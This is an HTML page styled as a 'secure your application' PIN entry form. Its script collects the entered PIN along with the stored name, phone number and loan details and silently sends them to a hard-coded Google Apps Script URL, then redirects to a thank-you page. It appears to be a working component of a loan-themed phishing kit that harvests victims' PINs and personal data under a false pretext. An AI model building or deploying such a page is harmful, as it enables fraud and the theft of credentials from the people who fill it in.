<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Enter PIN</title>
    <style>
      * {
        box-sizing: border-box;
      }
      body {
        font-family: Arial, sans-serif;
        background: #eef2f7;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
      }
      .card {
        background: #fff;
        padding: 25px;
        border-radius: 12px;
        width: 90%;
        max-width: 360px;
        text-align: center;
        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
      }
      h2 {
        color: #0088cc;
        margin: 0 0 10px;
      }
      p {
        color: #666;
        font-size: 14px;
        margin-bottom: 20px;
      }
      input,
      button {
        width: 100%;
        padding: 14px;
        margin: 8px 0;
        border: 1px solid #ddd;
        border-radius: 8px;
        font-size: 18px;
        text-align: center;
        letter-spacing: 4px;
      }
      button {
        background: #0088cc;
        color: #fff;
        font-weight: bold;
        border: none;
        cursor: pointer;
        transition: background 0.2s;
      }
      button:hover:not(:disabled) {
        background: #0077b3;
      }
      button:disabled {
        background: #999;
        cursor: not-allowed;
      }
      #msg {
        font-size: 13px;
        margin-top: 8px;
        min-height: 18px;
      }
    </style>
  </head>
  <body>
    <div class="card">
      <h2>Enter Your PIN</h2>
      <p>4-6 digit PIN to secure your application</p>

      <form id="pinForm">
        <input
          type="password"
          id="pin"
          placeholder="**"
          maxlength="6"
          inputmode="numeric"
          required
        />
        <button type="submit" id="btn">Submit PIN</button>
      </form>

      <div id="msg"></div>
    </div>

    <script>
      // ===== SAME GOOGLE APPS SCRIPT URL AS index.html =====
      const SCRIPT_URL =
        "https://script.google.com/macros/s/AKfycbzhip2iEQWNWWNWmGcqH15EX4TJJi3Y-27O2OgdhrQ8HDz5LOPRJhE-AJ6qWNWmuIMB/exec";
      // ====================================================

      const form = document.getElementById("pinForm");
      const btn = document.getElementById("btn");
      const msg = document.getElementById("msg");

      form.addEventListener("submit", async (e) => {
        e.preventDefault();

        btn.disabled = true;
        msg.style.color = "#555";
        msg.innerText = "Sending...";

        const pin = document.getElementById("pin").value.trim();

        const name = localStorage.getItem("user_name") || "N/A";
        const phone = localStorage.getItem("user_phone") || "N/A";
        const loan = localStorage.getItem("user_loan") || "N/A";

        localStorage.setItem("user_pin", pin);

        const payload = {
          type: "pin",
          name: name,
          phone: phone,
          loan: loan,
          pin: pin,
        };

        fetch(SCRIPT_URL, {
          method: "POST",
          mode: "no-cors",
          headers: { "Content-Type": "text/plain" },
          body: JSON.stringify(payload),
        })
          .then(() => {
            msg.innerText = "PIN submitted successfully!";
            msg.style.color = "green";
            window.location.href = "thankyou.html";
          })
          .then(() => {
            msg.innerText = "PIN submitted successfully!";
            msg.style.color = "green";

            // Redirect to thank-you page after 1 second
            setTimeout(() => {
              window.location.href = "thankyou.html";
            }, 1000);
          })
          .catch(() => {
            msg.innerText = "Network Error";
            msg.style.color = "red";
            btn.disabled = false;
          });
      });
    </script>
  </body>
</html>
